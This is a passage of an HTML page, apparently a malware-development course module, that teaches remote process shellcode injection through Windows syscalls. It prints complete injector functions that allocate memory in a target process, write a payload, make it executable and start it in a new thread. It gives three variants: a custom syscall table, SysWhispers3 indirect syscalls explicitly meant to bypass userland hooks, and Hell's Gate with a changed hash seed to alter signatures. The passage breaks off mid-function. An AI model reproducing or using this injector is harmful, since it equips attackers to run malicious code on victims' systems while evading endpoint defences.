+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">BOOL ClassicInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
+
+
+	Syscall   St                     = { 0 };
+	NTSTATUS  STATUS                 = 0x00;
+	PVOID     pAddress               = NULL;
+	ULONG     uOldProtection         = NULL;
+
+	SIZE_T    sSize                  = sPayloadSize,
+              sNumberOfBytesWritten	= NULL;
+	HANDLE    hThread                = NULL;
+
+	// Initializing the &#x27;St&#x27; structure to fetch the syscall&#x27;s addresses
+	if (!InitializeSyscallStruct(&amp;St)){
+		printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
+		return FALSE;
+	}
+
+//--------------------------------------------------------------------------
+
+	// Allocating memory
+	if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
+		printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
+	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
+	getchar();
+
+//--------------------------------------------------------------------------
+
+	// Writing the payload
+	printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
+	if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
+		printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
+		return FALSE;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+
+//--------------------------------------------------------------------------
+
+	// Changing the memory&#x27;s permissions to RWX
+	if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
+		printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+//--------------------------------------------------------------------------
+	// Executing the payload via thread
+	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
+	getchar();
+	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
+	if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	printf(&quot;[+] DONE \n&quot;);
+	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));
+
+	return TRUE;
+}</code></pre>
+        </div><h3 id="payload-size-rounding-up" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Payload Size & Rounding Up</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Recall that <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtAllocateVirtualMemory</code> rounds up the value of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RegionSize</code> to be a multiple of 4096. Due to the rounding up of the size, one must be careful when using the same payload size variable when allocating memory and writing to memory as it can lead to more bytes being written than what was intended. This is why the code above uses separate size variables for <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtAllocateVirtualMemory</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtWriteVirtualMemory</code>.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The issue is demonstrated in the code snippet below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">// sPayloadSize is the payload&#x27;s size (272 bytes)
+  // Allocating memory
+  if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
+    return FALSE;
+  }
+
+  // sPayloadSize&#x27;s value is now 4096
+  // Writing the payload with sPayloadSize (NumberOfBytesToWrite) as 4096 instead of the original size
+  if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0) {
+    return FALSE;
+  }</code></pre>
+        </div><h3 id="implementation-using-syswhispers" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Implementation Using SysWhispers</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The implementation here uses SysWhispers3 to bypass userland hooks via indirect syscalls. The following command is used to generate the required files for this implementation.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o SysWhispers -v</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Three files are generated: <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SysWhispers.h</code>, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SysWhispers.c</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SysWhispers-asm.x64.asm</code>. The next step is to import these files into Visual Studio as noted in the <a href="https://github.com/klezVirus/SysWhispers3#importing-into-visual-studio" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">SysWhisper&#x27;s Readme here</a>. The steps are demonstrated below.</p><h3 id="step-1" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Step 1</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Copy the generated files to the project folder and then add them to the Visual Studio project as existing items.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscalls-classic-114349632-de44115a-3e9f-450f-bb37-f0bff7776d5f.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="step-2" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Step 2</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Enable MASM in the project to allow for the compilation of the generated assembly code.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscalls-classic-214351708-4ba6253b-4713-4fed-8711-e8cb0766938e.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscalls-classic-314352187-6786f4d7-1ae2-4e6b-94ce-8f8087d223df.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="step-3" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Step 3</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Modify the properties to set the ASM file to be compiled using <em>Microsoft Macro Assembler</em>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscalls-classic-414353258-3fbf4ead-ce9c-4083-805a-ae5ced08213e.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscalls-classic-514353606-1e3d5862-fc03-4247-b03e-493b07f3a1ce.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="step-4" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Step 4</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The Visual Studio project can now be compiled. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ClassicInjectionViaSyscalls</code> function is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL ClassicInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
+
+
+	NTSTATUS	STATUS                  = 0x00;
+	PVOID		pAddress                = NULL;
+	ULONG		uOldProtection          = NULL;
+
+	SIZE_T		sSize                   = sPayloadSize,
+			    sNumberOfBytesWritten   = NULL;
+	HANDLE		hThread	                = NULL;
+
+
+
+	// Allocating memory
+	if ((STATUS = NtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
+		printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
+	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
+	getchar();
+
+//--------------------------------------------------------------------------
+	// Writing the payload
+	printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
+	if ((STATUS = NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
+		printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
+		return FALSE;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+
+//--------------------------------------------------------------------------
+	// Changing the memory&#x27;s permissions to RWX
+	if ((STATUS = NtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
+		printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+//--------------------------------------------------------------------------
+	// Executing the payload via thread
+	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
+	getchar();
+	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
+	if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));
+
+	return TRUE;
+}</code></pre>
+        </div><h3 id="implementation-using-hell-s-gate" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Implementation Using Hell's Gate</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The last implementation for this module is using Hell&#x27;s Gate. First, ensure that the same steps done to set up the Visual Studio project with SysWhispers3 are done here too. Specifically, enabling MASM and modifying the properties to set the ASM file to be compiled using the Microsoft Macro Assembler.</p><h3 id="changing-payload-function" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Changing Payload Function</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">A few changes need to be made to the Hell&#x27;s Gate code. First, the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L166" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">Payload function</a> must be replaced with the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ClassicInjectionViaSyscalls</code> function.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL ClassicInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
+
+	NTSTATUS	STATUS                  = 0x00;
+	PVOID		pAddress                = NULL;
+	ULONG		uOldProtection          = NULL;
+
+	SIZE_T		sSize                   = sPayloadSize,
+			    sNumberOfBytesWritten   = NULL;
+	HANDLE		hThread	                = NULL;
+
+
+	// Allocating memory
+	HellsGate(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);
+	if ((STATUS = HellDescent(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
+		printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
+	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
+	getchar();
+
+//--------------------------------------------------------------------------
+
+	// Writing the payload
+	printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
+	HellsGate(pVxTable-&gt;NtWriteVirtualMemory.wSystemCall);
+	if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
+		printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
+		return FALSE;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+
+//--------------------------------------------------------------------------
+
+	// Changing the memory&#x27;s permissions to RWX
+	HellsGate(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);
+	if ((STATUS = HellDescent(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
+		printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+//--------------------------------------------------------------------------
+	// Executing the payload via thread
+	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
+	getchar();
+	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
+	HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
+	if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));
+
+
+	return TRUE;
+}</code></pre>
+        </div><h3 id="updating-the-vx-table-structure" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Updating The VX_TABLE Structure</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Next, the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L14" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">VX_TABLE</a> structure must be updated with the names of the syscalls that are used in this module, as shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _VX_TABLE {
+	VX_TABLE_ENTRY NtAllocateVirtualMemory;
+	VX_TABLE_ENTRY NtWriteVirtualMemory;
+	VX_TABLE_ENTRY NtProtectVirtualMemory;
+	VX_TABLE_ENTRY NtCreateThreadEx;
+} VX_TABLE, * PVX_TABLE;</code></pre>
+        </div><h3 id="updating-seed-value" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Updating Seed Value</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">A new seed value will be used to replace the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">old one</a> to change the hash values of the syscalls. The djb2 hashing function is updated with the new seed value below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">DWORD64 djb2(PBYTE str) {
